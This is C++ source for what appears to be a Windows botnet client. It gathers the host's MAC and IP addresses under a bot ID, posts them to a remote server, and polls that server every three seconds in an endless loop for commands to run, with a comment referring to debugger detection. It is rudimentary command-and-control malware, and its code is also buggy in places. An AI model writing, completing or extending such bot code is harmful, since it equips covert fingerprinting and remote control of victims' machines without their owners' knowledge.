#define _CRT_SECURE_NO_WARNINGS
#include "UtilLib.h"
#include "HttpLib.h"
#include <strsafe.h>
#include <Windows.h>
#include <iostream>
#include "ActionController.h"
#include <Iphlpapi.h>
#include <vector>
#include "DataCollector.h"

char* GetOS();
char* GetIP();
char* getMAC();
void handleAction();


#pragma comment(lib, "ws2_32.lib")
vector<vector<string>> requestQueue;
typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
#define EXECUTE
ActionController ac;
DataCollector dc;
typedef BOOL(WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);
char *BOT_ID = "3";
vector<string> values = vector<string>();
#pragma comment(lib, "iphlpapi.lib")
#define BOTLOOP
vector<string> keys = vector<string>();
using namespace std;

int main() {
#if defined(BOTLOOP) || defined(EXECUTE)
	char* MAC_ADDR = getMAC();
	dc.addDataPair("bot_id", BOT_ID);
	dc.addDataPair("mac_address", MAC_ADDR);
#endif
	// body of detect debugger
	char *ip = GetIP();
	dc.addDataPair("ip_address", ip);

#ifdef EXECUTE
	printf("posting: %s\n", dc.getPostData().c_str());
	sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData());
	dc.dumpCollectedData();
#endif
#ifdef BOTLOOP
	string response = "";
	struct Action action;
	ac.addAction(action);
	int reqCounter = 0;
	while (1) {
		response = sendG_Request(url, port, "/database/api/connect_in/", requestQueue, dc.getGetData());
		action = ac.parseAction(response);
		ac.addAction(action);
		handleAction();
		reqCounter++;
		Sleep(3000);
		if (reqCounter % 5 == 0) {
			sendP_Request(url, port, "/database/api/handler/", requestQueue, dc.getPostData());
			dc.dumpCollectedData();
		}
	}
#endif
}

char* getMAC() {
	PIP_ADAPTER_INFO AdapterInfo;
	DWORD dwBufLen = sizeof(AdapterInfo);
	char *mac_addr = (char*)malloc(17);
	AdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
		AdapterInfo = (IP_ADAPTER_INFO *)malloc(dwBufLen);
	}
	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
		PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
		do {
			sprintf(mac_addr, "%02X:%02X:%02X:%02X:%02X:%02X",
				pAdapterInfo->Address[0], pAdapterInfo->Address[1],
				pAdapterInfo->Address[2], pAdapterInfo->Address[3],
				pAdapterInfo->Address[4], pAdapterInfo->Address[5]);
			return mac_addr;
			pAdapterInfo = pAdapterInfo->Next;
		} while (pAdapterInfo);
	}
	free(AdapterInfo);
}
char* GetIP()
{
	WSAData wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	HOSTENT* Host;
	char hostname[128] = { 0 };
	char* IPv4 = new char[128];
	gethostname(hostname, 128);
	Host = gethostbyname(hostname);
	IPv4 = inet_ntoa(*(in_addr*)Host->h_addr_list[0]);
	WSACleanup();
	return IPv4;
}
char* GetOS()
{
		return "Unix";
}
void handleAction() {
	struct Action action;
	while (ac.hasAction()) {
		action = ac.getNextAction();
		printf("action %s\n", action.action.c_str());
		if (action.action == "Send IP Address") {
			char *ip = GetIP();
			dc.addDataPair("ip_address", ip);
		}
		if (action.action == "Send OS") {
			char *os = GetOS();
			dc.addDataPair("os", os);
		}
		action = ac.getNextAction();
	}
	printf("Data so far: %s\n", dc.getPostData().c_str());
}
